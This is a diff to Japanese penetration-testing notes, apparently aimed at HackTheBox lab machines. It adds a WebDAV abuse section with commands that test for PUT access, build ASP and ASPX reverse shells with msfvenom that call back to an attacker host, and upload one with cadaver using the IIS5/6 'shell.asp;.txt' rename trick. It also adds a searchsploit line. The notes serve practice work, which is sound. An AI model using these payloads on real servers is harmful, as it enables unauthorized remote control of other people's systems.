@@ -497,6 +497,25 @@ XXEを悪用することで、サーバ内のファイルの取得や情報収�
 
 参考：[XXE(XML外部実体参照)](/hackthebox-linux-bugbountyhunter#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7)
 
+### WebDavの悪用
+
+- `davtest`でPUTが可能な場合はリバースシェルを取得できる可能性がある
+- IIS5/IIS6を使用している場合は、[Renameの脆弱性](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability)がある
+
+``` bash
+# davtest
+$ /usr/bin/davtest -url http://targethost.htb/
+
+# エクスプロイトの生成
+$ msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f asp > shell.txt
+$ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -o rev.aspx
+
+# cadaverでファイル転送とRename
+$ cadaver http://targethost.htb
+dav:/> put shell.txt
+dav:/> copy shell.txt shell.asp;.txt
+```
+
 ## その他のエクスプロイト
 
 ### SMB、Active Directoryを悪用したリモートアクセス
@@ -571,6 +590,9 @@ pip install xlrd==1.1.0
 rm ./*.xls
 python windows-exploit-suggester.py --update
 ls ./*.xls | (read d; python windows-exploit-suggester.py --systeminfo systeminfo.txt --database $d)
+
+# Serchsploit
+searchsploit <Keyword>
 ```
 
 ### Windowsユーザ情報、セキュリティ特権の探索
